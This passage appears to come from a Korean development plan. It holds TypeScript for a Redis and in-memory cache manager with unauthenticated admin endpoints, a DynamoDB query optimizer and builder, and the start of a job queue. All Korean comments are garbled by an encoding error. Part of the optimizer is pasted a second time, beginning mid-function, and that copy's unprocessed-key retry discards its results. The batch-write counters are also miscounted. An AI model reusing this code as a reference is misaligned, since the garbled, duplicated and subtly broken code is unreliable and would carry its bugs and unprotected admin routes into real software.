  [CacheNamespace.SESSION]: 3600         // 1ì‹œê°„
};

export class CacheManager {
  private redis: Redis;
  private memoryCache: LRUCache<string, any>;
  private stats = {
    hits: 0,
    misses: 0,
    errors: 0
  };
  
  constructor() {
    // Redis ì—°ê²°
    this.redis = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
      password: process.env.REDIS_PASSWORD,
      db: parseInt(process.env.REDIS_DB || '0'),
      retryStrategy: (times) => {
        const delay = Math.min(times * 50, 2000);
        return delay;
      },
      enableOfflineQueue: true
    });
    
    // ì¸ë©”ëª¨ë¦¬ ìºì‹œ (L1 ìºì‹œ)
    this.memoryCache = new LRUCache({
      max: 1000,
      ttl: 60000, // 1ë¶„
      updateAgeOnGet: true,
      updateAgeOnHas: true
    });
    
    // Redis ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬
    this.redis.on('error', (err) => {
      logger.error('Redis connection error:', err);
    });
    
    this.redis.on('connect', () => {
      logger.info('Redis connected successfully');
    });
  }
  
  // ìºì‹œ í‚¤ ìƒì„±
  private generateKey(namespace: CacheNamespace, identifier: string, params?: any): string {
    if (!params) {
      return `${namespace}:${identifier}`;
    }
    
    // íŒŒë¼ë¯¸í„° í•´ì‹œí™”
    const paramHash = crypto
      .createHash('md5')
      .update(JSON.stringify(params))
      .digest('hex');
    
    return `${namespace}:${identifier}:${paramHash}`;
  }
  
  // ìºì‹œ ê°€ì ¸ì˜¤ê¸° (L1 -> L2)
  async get<T>(
    namespace: CacheNamespace,
    identifier: string,
    params?: any
  ): Promise<T | null> {
    const key = this.generateKey(namespace, identifier, params);
    
    try {
      // L1 ìºì‹œ í™•ì¸
      const memoryValue = this.memoryCache.get(key);
      if (memoryValue !== undefined) {
        this.stats.hits++;
        logger.debug(`Cache hit (L1): ${key}`);
        return memoryValue;
      }
      
      // L2 ìºì‹œ (Redis) í™•ì¸
      const redisValue = await this.redis.get(key);
      if (redisValue) {
        this.stats.hits++;
        logger.debug(`Cache hit (L2): ${key}`);
        
        const parsed = JSON.parse(redisValue);
        
        // L1 ìºì‹œì— ì €ì¥
        this.memoryCache.set(key, parsed);
        
        return parsed;
      }
      
      this.stats.misses++;
      logger.debug(`Cache miss: ${key}`);
      return null;
      
    } catch (error) {
      this.stats.errors++;
      logger.error(`Cache get error for ${key}:`, error);
      return null;
    }
  }
  
  // ìºì‹œ ì €ì¥
  async set<T>(
    namespace: CacheNamespace,
    identifier: string,
    value: T,
    params?: any,
    ttl?: number
  ): Promise<void> {
    const key = this.generateKey(namespace, identifier, params);
    const finalTTL = ttl || CacheTTL[namespace] || 3600;
    
    try {
      const serialized = JSON.stringify(value);
      
      // L2 ìºì‹œ (Redis) ì €ì¥
      await this.redis.setex(key, finalTTL, serialized);
      
      // L1 ìºì‹œ (Memory) ì €ì¥
      this.memoryCache.set(key, value);
      
      logger.debug(`Cache set: ${key} (TTL: ${finalTTL}s)`);
      
    } catch (error) {
      this.stats.errors++;
      logger.error(`Cache set error for ${key}:`, error);
    }
  }
  
  // ìºì‹œ ë¬´íš¨í™”
  async invalidate(namespace: CacheNamespace, identifier: string, params?: any): Promise<void> {
    const key = this.generateKey(namespace, identifier, params);
    
    try {
      // L1 ìºì‹œ ì‚­ì œ
      this.memoryCache.delete(key);
      
      // L2 ìºì‹œ ì‚­ì œ
      await this.redis.del(key);
      
      logger.debug(`Cache invalidated: ${key}`);
      
    } catch (error) {
      logger.error(`Cache invalidation error for ${key}:`, error);
    }
  }
  
  // íŒ¨í„´ ê¸°ë°˜ ìºì‹œ ë¬´íš¨í™”
  async invalidatePattern(pattern: string): Promise<void> {
    try {
      // L1 ìºì‹œì—ì„œ íŒ¨í„´ ë§¤ì¹­ ì‚­ì œ
      for (const key of this.memoryCache.keys()) {
        if (key.match(pattern)) {
          this.memoryCache.delete(key);
        }
      }
      
      // L2 ìºì‹œì—ì„œ íŒ¨í„´ ë§¤ì¹­ ì‚­ì œ
      const keys = await this.redis.keys(pattern);
      if (keys.length > 0) {
        await this.redis.del(...keys);
        logger.debug(`Cache invalidated ${keys.length} keys matching pattern: ${pattern}`);
      }
      
    } catch (error) {
      logger.error(`Pattern cache invalidation error:`, error);
    }
  }
  
  // ìºì‹œ í†µê³„
  getStats() {
    const hitRate = this.stats.hits / (this.stats.hits + this.stats.misses) || 0;
    
    return {
      ...this.stats,
      hitRate: (hitRate * 100).toFixed(2) + '%',
      memoryCacheSize: this.memoryCache.size,
      memoryCacheCapacity: this.memoryCache.max
    };
  }
  
  // ìºì‹œ ì˜ˆì—´ (Cache Warming)
  async warmCache(namespace: CacheNamespace, items: Array<{ identifier: string; value: any; params?: any }>): Promise<void> {
    logger.info(`Warming cache for namespace: ${namespace}`);
    
    const promises = items.map(item =>
      this.set(namespace, item.identifier, item.value, item.params)
    );
    
    await Promise.all(promises);
    
    logger.info(`Cache warmed with ${items.length} items`);
  }
  
  // ìºì‹œ íƒœê·¸ ì‹œìŠ¤í…œ
  async setWithTags<T>(
    namespace: CacheNamespace,
    identifier: string,
    value: T,
    tags: string[],
    params?: any,
    ttl?: number
  ): Promise<void> {
    await this.set(namespace, identifier, value, params, ttl);
    
    // íƒœê·¸ë³„ë¡œ í‚¤ ì €ì¥
    const key = this.generateKey(namespace, identifier, params);
    for (const tag of tags) {
      await this.redis.sadd(`tag:${tag}`, key);
      await this.redis.expire(`tag:${tag}`, 86400); // 24ì‹œê°„
    }
  }
  
  // íƒœê·¸ ê¸°ë°˜ ìºì‹œ ë¬´íš¨í™”
  async invalidateByTag(tag: string): Promise<void> {
    const keys = await this.redis.smembers(`tag:${tag}`);
    
    if (keys.length > 0) {
      // ëª¨ë“  ê´€ë ¨ í‚¤ ì‚­ì œ
      await Promise.all(keys.map(key => {
        this.memoryCache.delete(key);
        return this.redis.del(key);
      }));
      
      // íƒœê·¸ ì‚­ì œ
      await this.redis.del(`tag:${tag}`);
      
      logger.debug(`Invalidated ${keys.length} cache entries with tag: ${tag}`);
    }
  }
}

// ìºì‹± ë°ì½”ë ˆì´í„°
export function Cacheable(namespace: CacheNamespace, ttl?: number) {
  return function (target: any, propertyName: string, descriptor: PropertyDescriptor) {
    const originalMethod = descriptor.value;
    
    descriptor.value = async function (...args: any[]) {
      const cacheManager = (this as any).cacheManager || new CacheManager();
      
      // ìºì‹œ í‚¤ ìƒì„±ì„ ìœ„í•œ ì‹ë³„ì
      const identifier = `${target.constructor.name}.${propertyName}`;
      const params = args.length > 0 ? args : undefined;
      
      // ìºì‹œ í™•ì¸
      const cached = await cacheManager.get(namespace, identifier, params);
      if (cached !== null) {
        return cached;
      }
      
      // ì›ë³¸ ë©”ì„œë“œ ì‹¤í–‰
      const result = await originalMethod.apply(this, args);
      
      // ê²°ê³¼ ìºì‹±
      await cacheManager.set(namespace, identifier, result, params, ttl);
      
      return result;
    };
    
    return descriptor;
  };
}

// HTTP ì‘ë‹µ ìºì‹± ë¯¸ë“¤ì›¨ì–´
export function httpCacheMiddleware(options: {
  namespace?: CacheNamespace;
  ttl?: number;
  keyGenerator?: (req: Request) => string;
}) {
  const cacheManager = new CacheManager();
  const {
    namespace = CacheNamespace.API_RESPONSE,
    ttl = 300,
    keyGenerator = (req) => `${req.method}:${req.path}:${JSON.stringify(req.query)}`
  } = options;
  
  return async (req: Request, res: Response, next: NextFunction) => {
    // POST, PUT, DELETE ìš”ì²­ì€ ìºì‹±í•˜ì§€ ì•ŠìŒ
    if (req.method !== 'GET') {
      return next();
    }
    
    const cacheKey = keyGenerator(req);
    
    // ìºì‹œ í™•ì¸
    const cached = await cacheManager.get(namespace, cacheKey);
    if (cached) {
      res.setHeader('X-Cache', 'HIT');
      res.setHeader('X-Cache-TTL', ttl.toString());
      return res.json(cached);
    }
    
    // ì›ë³¸ ì‘ë‹µ ìºì‹±
    const originalJson = res.json;
    res.json = function (data: any) {
      res.setHeader('X-Cache', 'MISS');
      
      // ì„±ê³µ ì‘ë‹µë§Œ ìºì‹±
      if (res.statusCode >= 200 && res.statusCode < 300) {
        cacheManager.set(namespace, cacheKey, data, undefined, ttl)
          .catch(err => logger.error('Failed to cache response:', err));
      }
      
      return originalJson.call(this, data);
    };
    
    next();
  };
}

// ìºì‹œ ê´€ë¦¬ API ì—”ë“œí¬ì¸íŠ¸
export function setupCacheManagementEndpoints(app: Express, cacheManager: CacheManager): void {
  // ìºì‹œ í†µê³„
  app.get('/api/admin/cache/stats', (req, res) => {
    res.json(cacheManager.getStats());
  });
  
  // ìºì‹œ ë¬´íš¨í™”
  app.delete('/api/admin/cache/invalidate', async (req, res) => {
    const { namespace, identifier, pattern } = req.body;
    
    try {
      if (pattern) {
        await cacheManager.invalidatePattern(pattern);
      } else if (namespace && identifier) {
        await cacheManager.invalidate(namespace as CacheNamespace, identifier);
      } else {
        return res.status(400).json({ error: 'Invalid parameters' });
      }
      
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: 'Cache invalidation failed' });
    }
  });
  
  // ìºì‹œ ì˜ˆì—´
  app.post('/api/admin/cache/warm', async (req, res) => {
    const { namespace, items } = req.body;
    
    try {
      await cacheManager.warmCache(namespace as CacheNamespace, items);
      res.json({ success: true, count: items.length });
    } catch (error) {
      res.status(500).json({ error: 'Cache warming failed' });
    }
  });
}
```
---

### SubTask 0.11.2: ë°ì´í„°ë² ì´ìŠ¤ ì¿¼ë¦¬ ìµœì í™”
**ëª©í‘œ**: DynamoDB ë° ê¸°íƒ€ ë°ì´í„°ë² ì´ìŠ¤ ì¿¼ë¦¬ ìµœì í™”

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/performance/query-optimizer.ts
import { DynamoDBDocumentClient, QueryCommand, BatchGetCommand, BatchWriteCommand, UpdateCommand } from '@aws-sdk/lib-dynamodb';
import { logger } from '../config/logger';
import { MetricsHelper } from '../config/metrics';

// ì¿¼ë¦¬ ì„±ëŠ¥ ëª¨ë‹ˆí„°ë§
interface QueryMetrics {
  operation: string;
  table: string;
  duration: number;
  itemCount: number;
  consumedCapacity?: number;
  retryCount: number;
}

export class QueryOptimizer {
  private docClient: DynamoDBDocumentClient;
  private queryCache: Map<string, { data: any; timestamp: number }> = new Map();
  private readonly CACHE_TTL = 60000; // 1ë¶„
  
  constructor(docClient: DynamoDBDocumentClient) {
    this.docClient = docClient;
    
    // ì •ê¸°ì ìœ¼ë¡œ ìºì‹œ ì •ë¦¬
    setInterval(() => this.cleanupCache(), 300000); // 5ë¶„ë§ˆë‹¤
  }
  
  // ë°°ì¹˜ ì½ê¸° ìµœì í™”
  async batchGet<T>(
    tableName: string,
    keys: Array<Record<string, any>>,
    projectionExpression?: string
  ): Promise<T[]> {
    const startTime = Date.now();
    const results: T[] = [];
    const uncachedKeys: Array<Record<string, any>> = [];
    
    // ìºì‹œì—ì„œ ë¨¼ì € í™•ì¸
    for (const key of keys) {
      const cacheKey = this.generateCacheKey(tableName, key);
      const cached = this.getFromCache(cacheKey);
      
      if (cached) {
        results.push(cached);
      } else {
        uncachedKeys.push(key);
      }
    }
    
    // ìºì‹œë˜ì§€ ì•Šì€ í•­ëª©ë§Œ ì¡°íšŒ
    if (uncachedKeys.length > 0) {
      // DynamoDBëŠ” ìµœëŒ€ 100ê°œê¹Œì§€ ë°°ì¹˜ ì¡°íšŒ ê°€ëŠ¥
      const chunks = this.chunkArray(uncachedKeys, 100);
      
      for (const chunk of chunks) {
        const params: any = {
          RequestItems: {
            [tableName]: {
              Keys: chunk
            }
          }
        };
        
        if (projectionExpression) {
          params.RequestItems[tableName].ProjectionExpression = projectionExpression;
        }
        
        try {
          const response = await this.docClient.send(new BatchGetCommand(params));
          
          if (response.Responses?.[tableName]) {
            const items = response.Responses[tableName] as T[];
            results.push(...items);
            
            // ìºì‹œì— ì €ì¥
            items.forEach((item: any) => {
              const key = this.extractKey(tableName, item);
              const cacheKey = this.generateCacheKey(tableName, key);
              this.setCache(cacheKey, item);
            });
          }
          
          // ì²˜ë¦¬ë˜ì§€ ì•Šì€ í‚¤ê°€ ìˆìœ¼ë©´ ì¬ì‹œë„
          if (response.UnprocessedKeys?.[tableName]) {
            await this.handleUnprocessedKeys(
              tableName,
              response.UnprocessedKeys[tableName].Keys!,
              results
            );
          }
          
        } catch (error) {
          logger.error(`Batch get error for table ${tableName}:`, error);
          throw error;
        }
      }
    }
    
    // ë©”íŠ¸ë¦­ ê¸°ë¡
    const duration = Date.now() - startTime;
    this.recordQueryMetrics({
      operation: 'batchGet',
      table: tableName,
      duration,
      itemCount: results.length,
      retryCount: 0
    });
    
    return results;
  }
  
  // ë°°ì¹˜ ì“°ê¸° ìµœì í™”
  async batchWrite(
    tableName: string,
    items: Array<{ PutRequest?: { Item: any }; DeleteRequest?: { Key: any } }>
  ): Promise<void> {
    const startTime = Date.now();
    let processedCount = 0;
    let retryCount = 0;
    
    // DynamoDBëŠ” ìµœëŒ€ 25ê°œê¹Œì§€ ë°°ì¹˜ ì“°ê¸° ê°€ëŠ¥
    const chunks = this.chunkArray(items, 25);
    
    for (const chunk of chunks) {
      const params = {
        RequestItems: {
          [tableName]: chunk
        }
      };
      
      let unprocessedItems = chunk;
      const maxRetries = 3;
      
      while (unprocessedItems.length > 0 && retryCount < maxRetries) {
        try {
          const response = await this.docClient.send(new BatchWriteCommand({
            RequestItems: {
              [tableName]: unprocessedItems
            }
          }));
          
          processedCount += unprocessedItems.length;
          
          if (response.UnprocessedItems?.[tableName]) {
            unprocessedItems = response.UnprocessedItems[tableName];
            retryCount++;
            
            // ì§€ìˆ˜ ë°±ì˜¤í”„
            await this.exponentialBackoff(retryCount);
          } else {
            unprocessedItems = [];
          }
          
          // ìºì‹œ ë¬´íš¨í™”
          chunk.forEach(item => {
            if (item.PutRequest) {
              const key = this.extractKey(tableName, item.PutRequest.Item);
              const cacheKey = this.generateCacheKey(tableName, key);
              this.invalidateCache(cacheKey);
            } else if (item.DeleteRequest) {
              const cacheKey = this.generateCacheKey(tableName, item.DeleteRequest.Key);
              this.invalidateCache(cacheKey);
            }
          });
          
        } catch (error) {
          logger.error(`Batch write error for table ${tableName}:`, error);
          throw error;
        }
      }
      
      if (unprocessedItems.length > 0) {
        logger.warn(`${unprocessedItems.length} items were not processed after ${maxRetries} retries`);
      }
    }
    
    // ë©”íŠ¸ë¦­ ê¸°ë¡
    const duration = Date.now() - startTime;
    this.recordQueryMetrics({
      operation: 'batchWrite',
      table: tableName,
      duration,
      itemCount: processedCount,
      retryCount
    });
  }
  
  // í˜ì´ì§€ë„¤ì´ì…˜ ìµœì í™”
  async *paginatedQuery<T>(
    tableName: string,
    keyConditionExpression: string,
    expressionAttributeValues: Record<string, any>,
    options: {
      indexName?: string;
      projectionExpression?: string;
      filterExpression?: string;
      limit?: number;
      scanIndexForward?: boolean;
    } = {}
  ): AsyncGenerator<T[], void, unknown> {
    let lastEvaluatedKey: Record<string, any> | undefined;
    let totalItems = 0;
    const startTime = Date.now();
    
    do {
      const params: any = {
        TableName: tableName,
        KeyConditionExpression: keyConditionExpression,
        ExpressionAttributeValues: expressionAttributeValues,
        Limit: options.limit || 100,
        ExclusiveStartKey: lastEvaluatedKey
      };
      
      // ì˜µì…˜ ì¶”ê°€
      if (options.indexName) params.IndexName = options.indexName;
      if (options.projectionExpression) params.ProjectionExpression = options.projectionExpression;
      if (options.filterExpression) params.FilterExpression = options.filterExpression;
      if (options.scanIndexForward !== undefined) params.ScanIndexForward = options.scanIndexForward;
      
      try {
        const response = await this.docClient.send(new QueryCommand(params));
        
        if (response.Items && response.Items.length > 0) {
          totalItems += response.Items.length;
          yield response.Items as T[];
        }
        
        lastEvaluatedKey = response.LastEvaluatedKey;
        
        // ì†Œë¹„ëœ ìš©ëŸ‰ ê¸°ë¡
        if (response.ConsumedCapacity) {
          this.recordConsumedCapacity(tableName, response.ConsumedCapacity);
        }
        
      } catch (error) {
        logger.error(`Query error for table ${tableName}:`, error);
        throw error;
      }
      
    } while (lastEvaluatedKey);
    
    // ì „ì²´ ì¿¼ë¦¬ ë©”íŠ¸ë¦­ ê¸°ë¡
    const duration = Date.now() - startTime;
    this.recordQueryMetrics({
      operation: 'paginatedQuery',
      table: tableName,
      duration,
      itemCount: totalItems,
      retryCount: 0
    });
  }
  
  // ë³‘ë ¬ ì¿¼ë¦¬ ì‹¤í–‰
  async parallelQueries<T>(
    queries: Array<{
      table: string;
      keyCondition: string;
      values: Record<string, any>;
      options?: any;
    }>
  ): Promise<T[][]> {
    const startTime = Date.now();
    
    const promises = queries.map(async (query) => {
      const items: T[] = [];
      
      for await (const batch of this.paginatedQuery<T>(
        query.table,
        query.keyCondition,
        query.values,
        query.options
      )) {
        items.push(...batch);
      }
      
      return items;
    });
    
    const results = await Promise.all(promises);
    
    // ë©”íŠ¸ë¦­ ê¸°ë¡
    const duration = Date.now() - startTime;
    const totalItems = results.reduce((sum, items) => sum + items.length, 0);
    
    this.recordQueryMetrics({
      operation: 'parallelQueries',
      table: 'multiple',
      duration,
      itemCount: totalItems,
      retryCount: 0
    });
    
    return results;
  }
  
  // ì¸ë±ìŠ¤ í”„ë¡œì ì…˜ ìµœì í™”
  optimizeProjection(
    requiredAttributes: string[],
    indexProjections: Record<string, string[]>
  ): { indexName?: string; projectionExpression?: string } {
    // í•„ìš”í•œ ì†ì„±ì„ ëª¨ë‘ í¬í•¨í•˜ëŠ” ê°€ì¥ ì‘ì€ ì¸ë±ìŠ¤ ì°¾ê¸°
    let bestIndex: string | undefined;
    let minExtraAttributes = Infinity;
    
    for (const [indexName, projectedAttributes] of Object.entries(indexProjections)) {
      const missingAttributes = requiredAttributes.filter(
        attr => !projectedAttributes.includes(attr)
      );
      
      if (missingAttributes.length === 0) {
        // ëª¨ë“  ì†ì„±ì„ í¬í•¨í•˜ëŠ” ì¸ë±ìŠ¤ ë°œê²¬
        const extraAttributes = projectedAttributes.length - requiredAttributes.length;
        if (extraAttributes < minExtraAttributes) {
          bestIndex = indexName;
          minExtraAttributes = extraAttributes;
        }
      }
    }
    
    return {
      indexName: bestIndex,
      projectionExpression: requiredAttributes.join(', ')
    };
  }
  
  // ì¡°ê±´ë¶€ ì“°ê¸° ìµœì í™”
  async conditionalWrite(
    tableName: string,
    key: Record<string, any>,
    updateExpression: string,
    conditionExpression: string,
    expressionAttributeValues: Record<string, any>,
    retryOptions = { maxRetries: 3, baseDelay: 100 }
  ): Promise<void> {
    let retryCount = 0;
    
    while (retryCount <= retryOptions.maxRetries) {
      try {
        await this.docClient.send(new UpdateCommand({
          TableName: tableName,
          Key: key,
          UpdateExpression: updateExpression,
          ConditionExpression: conditionExpression,
          ExpressionAttributeValues: expressionAttributeValues,
          ReturnConsumedCapacity: 'TOTAL'
        }));
        
        // ì„±ê³µí•˜ë©´ ìºì‹œ ë¬´íš¨í™”
        const cacheKey = this.generateCacheKey(tableName, key);
        this.invalidateCache(cacheKey);
        
        return;
        
      } catch (error: any) {
        if (error.name === 'ConditionalCheckFailedException') {
          if (retryCount < retryOptions.maxRetries) {
            // ì¡°ê±´ í™•ì¸ ì‹¤íŒ¨ ì‹œ ì¬ì‹œë„
            await this.exponentialBackoff(retryCount, retryOptions.baseDelay);
            retryCount++;
          } else {
            throw error;
          }
        } else {
          throw error;
        }
      }
    }
  }
  
  // í—¬í¼ ë©”ì„œë“œë“¤
  private chunkArray<T>(array: T[], size: number): T[][] {
    const chunks: T[][] = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
  
  private async exponentialBackoff(retryCount: number, baseDelay: number = 100): Promise<void> {
    const delay = baseDelay * Math.pow(2, retryCount) + Math.random() * 100;
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  private generateCacheKey(tableName: string, key: Record<string, any>): string {
    return `${tableName}:${JSON.stringify(key)}`;
  }
  
  private getFromCache(key: string): any {
    const cached = this.queryCache.get(key);
    if (cached && Date.now() - cached.timestamp < this.CACHE_TTL) {
      return cached.data;
    }
    return null;
  }
  
  private setCache(key: string, data: any): void {
    this.queryCache.set(key, {
      data,
      timestamp: Date.now()
    });
  }
  
  private invalidateCache(key: string): void {
    this.queryCache.delete(key);
  }
  
  private cleanupCache(): void {
    const now = Date.now();
    for (const [key, value] of this.queryCache.entries()) {
      if (now - value.timestamp > this.CACHE_TTL) {
        this.queryCache.delete(key);
      }
    }
  }
  
  private extractKey(tableName: string, item: any): Record<string, any> {
    // í…Œì´ë¸”ë³„ í‚¤ ì¶”ì¶œ ë¡œì§
    return { id: item.id };
  }
  
  private async handleUnprocessedKeys<T>(
    tableName: string,
    unprocessedKeys: Array<Record<string, any>>,
    results: T[]
  ): Promise<void> {
    const retryResults = await this.batchGet<T>(tableName, unprocessedKeys);
    results.push(...retryResults);
  }
  
  private recordQueryMetrics(metrics: QueryMetrics): void {
    MetricsHelper.recordDatabaseOperation(
      metrics.operation,
      metrics.table,
      metrics.duration,
      metrics.itemCount
    );
    
    logger.debug('Query metrics:', metrics);
  }
  
  private recordConsumedCapacity(tableName: string, capacity: any): void {
    if (capacity.CapacityUnits) {
      MetricsHelper.recordConsumedCapacity(
        tableName,
        capacity.CapacityUnits
      );
    }
  }
}

// ì¿¼ë¦¬ ë¹Œë” í—¬í¼
export class DynamoQueryBuilder {
  private keyConditions: string[] = [];
  private filterConditions: string[] = [];
  private attributeValues: Record<string, any> = {};
  private attributeNames: Record<string, string> = {};
  private projectionAttributes: string[] = [];
  
  key(attribute: string, operator: '=' | '<' | '<=' | '>' | '>=' | 'BETWEEN' | 'begins_with', value: any): this {
    const placeholder = `:${attribute}`;
    
    switch (operator) {
      case '=':
        this.keyConditions.push(`${attribute} = ${placeholder}`);
        this.attributeValues[placeholder] = value;
        break;
      case 'BETWEEN':
        this.keyConditions.push(`${attribute} BETWEEN ${placeholder}1 AND ${placeholder}2`);
        this.attributeValues[`${placeholder}1`] = value[0];
        this.attributeValues[`${placeholder}2`] = value[1];
        break;
      case 'begins_with':
        this.keyConditions.push(`begins_with(${attribute}, ${placeholder})`);
        this.attributeValues[placeholder] = value;
        break;
      default:
        this.keyConditions.push(`${attribute} ${operator} ${placeholder}`);
        this.attributeValues[placeholder] = value;
    }
    
    return this;
  }
  
  filter(attribute: string, operator: string, value: any): this {
    const placeholder = `:filter${Object.keys(this.attributeValues).length}`;
    this.filterConditions.push(`${attribute} ${operator} ${placeholder}`);
    this.attributeValues[placeholder] = value;
    return this;
  }
  
  project(...attributes: string[]): this {
    this.projectionAttributes.push(...attributes);
    return this;
  }
  
  build(): {
    KeyConditionExpression: string;
    FilterExpression?: string;
    ProjectionExpression?: string;
    ExpressionAttributeValues: Record<string, any>;
    ExpressionAttributeNames?: Record<string, string>;
  } {
    const result: any = {
      KeyConditionExpression: this.keyConditions.join(' AND '),
      ExpressionAttributeValues: this.attributeValues
    };
    
    if (this.filterConditions.length > 0) {
      result.FilterExpression = this.filterConditions.join(' AND ');
    }
    
    if (this.projectionAttributes.length > 0) {
      result.ProjectionExpression = this.projectionAttributes.join(', ');
    }
    
    if (Object.keys(this.attributeNames).length > 0) {
      result.ExpressionAttributeNames = this.attributeNames;
    }
    
    return result;
  }
}

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- QueryOptimizerë¥¼ DynamoDB í´ë¼ì´ì–¸íŠ¸ì— í†µí•©
- ìºì‹œ TTL ë° í¬ê¸° ì œí•œ ì„¤ì •
- í…Œì´ë¸”ë³„ í‚¤ ì¶”ì¶œ ë¡œì§ êµ¬í˜„
- ì„±ëŠ¥ ë©”íŠ¸ë¦­ ëª¨ë‹ˆí„°ë§ ì„¤ì •

---
        const extraAttributes = projectedAttributes.length - requiredAttributes.length;
        if (extraAttributes < minExtraAttributes) {
          bestIndex = indexName;
          minExtraAttributes = extraAttributes;
        }
      }
    }
    
    return {
      indexName: bestIndex,
      projectionExpression: requiredAttributes.join(', ')
    };
  }
  
  // ì¡°ê±´ë¶€ ì“°ê¸° ìµœì í™”
  async conditionalWrite(
    tableName: string,
    key: Record<string, any>,
    updateExpression: string,
    conditionExpression: string,
    expressionAttributeValues: Record<string, any>,
    retryOptions = { maxRetries: 3, baseDelay: 100 }
  ): Promise<void> {
    let retryCount = 0;
    
    while (retryCount <= retryOptions.maxRetries) {
      try {
        await this.docClient.send(new UpdateCommand({
          TableName: tableName,
          Key: key,
          UpdateExpression: updateExpression,
          ConditionExpression: conditionExpression,
          ExpressionAttributeValues: expressionAttributeValues,
          ReturnConsumedCapacity: 'TOTAL'
        }));
        
        // ì„±ê³µí•˜ë©´ ìºì‹œ ë¬´íš¨í™”
        const cacheKey = this.generateCacheKey(tableName, key);
        this.invalidateCache(cacheKey);
        
        return;
        
      } catch (error: any) {
        if (error.name === 'ConditionalCheckFailedException') {
          if (retryCount < retryOptions.maxRetries) {
            // ì¡°ê±´ í™•ì¸ ì‹¤íŒ¨ ì‹œ ì¬ì‹œë„
            await this.exponentialBackoff(retryCount, retryOptions.baseDelay);
            retryCount++;
          } else {
            throw error;
          }
        } else {
          throw error;
        }
      }
    }
  }
  
  // í—¬í¼ ë©”ì„œë“œë“¤
  private chunkArray<T>(array: T[], size: number): T[][] {
    const chunks: T[][] = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
  
  private async exponentialBackoff(retryCount: number, baseDelay: number = 100): Promise<void> {
    const delay = baseDelay * Math.pow(2, retryCount) + Math.random() * 100;
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  private generateCacheKey(tableName: string, key: Record<string, any>): string {
    return `${tableName}:${JSON.stringify(key)}`;
  }
  
  private getFromCache(key: string): any {
    const cached = this.queryCache.get(key);
    if (cached && Date.now() - cached.timestamp < this.CACHE_TTL) {
      return cached.data;
    }
    return null;
  }
  
  private setCache(key: string, data: any): void {
    this.queryCache.set(key, {
      data,
      timestamp: Date.now()
    });
  }
  
  private invalidateCache(key: string): void {
    this.queryCache.delete(key);
  }
  
  private cleanupCache(): void {
    const now = Date.now();
    for (const [key, value] of this.queryCache.entries()) {
      if (now - value.timestamp > this.CACHE_TTL) {
        this.queryCache.delete(key);
      }
    }
  }
  
  private extractKey(tableName: string, item: any): Record<string, any> {
    // í…Œì´ë¸”ë³„ í‚¤ ì¶”ì¶œ ë¡œì§
    // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” í…Œì´ë¸” ìŠ¤í‚¤ë§ˆì— ë”°ë¼ ë‹¤ë¦„
    return { id: item.id };
  }
  
  private async handleUnprocessedKeys<T>(
    tableName: string,
    unprocessedKeys: Array<Record<string, any>>,
    results: T[]
  ): Promise<void> {
    // ì¬ì‹œë„ ë¡œì§
    await this.batchGet(tableName, unprocessedKeys);
  }
  
  private recordQueryMetrics(metrics: QueryMetrics): void {
    // ë©”íŠ¸ë¦­ ê¸°ë¡
    MetricsHelper.recordDatabaseOperation(
      metrics.operation,
      metrics.table,
      metrics.duration,
      metrics.itemCount
    );
    
    logger.debug('Query metrics:', metrics);
  }
  
  private recordConsumedCapacity(tableName: string, capacity: any): void {
    if (capacity.CapacityUnits) {
      MetricsHelper.recordConsumedCapacity(
        tableName,
        capacity.CapacityUnits
      );
    }
  }
}

// ì¿¼ë¦¬ ë¹Œë” í—¬í¼
export class DynamoQueryBuilder {
  private keyConditions: string[] = [];
  private filterConditions: string[] = [];
  private attributeValues: Record<string, any> = {};
  private attributeNames: Record<string, string> = {};
  private projectionAttributes: string[] = [];
  
  key(attribute: string, operator: '=' | '<' | '<=' | '>' | '>=' | 'BETWEEN' | 'begins_with', value: any): this {
    const placeholder = `:${attribute}`;
    
    switch (operator) {
      case '=':
        this.keyConditions.push(`${attribute} = ${placeholder}`);
        this.attributeValues[placeholder] = value;
        break;
      case 'BETWEEN':
        this.keyConditions.push(`${attribute} BETWEEN ${placeholder}1 AND ${placeholder}2`);
        this.attributeValues[`${placeholder}1`] = value[0];
        this.attributeValues[`${placeholder}2`] = value[1];
        break;
      case 'begins_with':
        this.keyConditions.push(`begins_with(${attribute}, ${placeholder})`);
        this.attributeValues[placeholder] = value;
        break;
      default:
        this.keyConditions.push(`${attribute} ${operator} ${placeholder}`);
        this.attributeValues[placeholder] = value;
    }
    
    return this;
  }
  
  filter(attribute: string, operator: string, value: any): this {
    const placeholder = `:filter${Object.keys(this.attributeValues).length}`;
    this.filterConditions.push(`${attribute} ${operator} ${placeholder}`);
    this.attributeValues[placeholder] = value;
    return this;
  }
  
  project(...attributes: string[]): this {
    this.projectionAttributes.push(...attributes);
    return this;
  }
  
  build(): {
    KeyConditionExpression: string;
    FilterExpression?: string;
    ProjectionExpression?: string;
    ExpressionAttributeValues: Record<string, any>;
    ExpressionAttributeNames?: Record<string, string>;
  } {
    const result: any = {
      KeyConditionExpression: this.keyConditions.join(' AND '),
      ExpressionAttributeValues: this.attributeValues
    };
    
    if (this.filterConditions.length > 0) {
      result.FilterExpression = this.filterConditions.join(' AND ');
    }
    
    if (this.projectionAttributes.length > 0) {
      result.ProjectionExpression = this.projectionAttributes.join(', ');
    }
    
    if (Object.keys(this.attributeNames).length > 0) {
      result.ExpressionAttributeNames = this.attributeNames;
    }
    
    return result;
  }
}
```

### SubTask 0.11.3: ë¹„ë™ê¸° ì‘ì—… í ì‹œìŠ¤í…œ
**ëª©í‘œ**: ë°±ê·¸ë¼ìš´ë“œ ì‘ì—… ì²˜ë¦¬ë¥¼ ìœ„í•œ í ì‹œìŠ¤í…œ êµ¬ì¶•

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/performance/job-queue.ts
import Bull, { Queue, Job, JobOptions, WorkerOptions, QueueScheduler } from 'bull';
import { logger } from '../config/logger';
import { MetricsHelper } from '../config/metrics';
import Redis from 'ioredis';

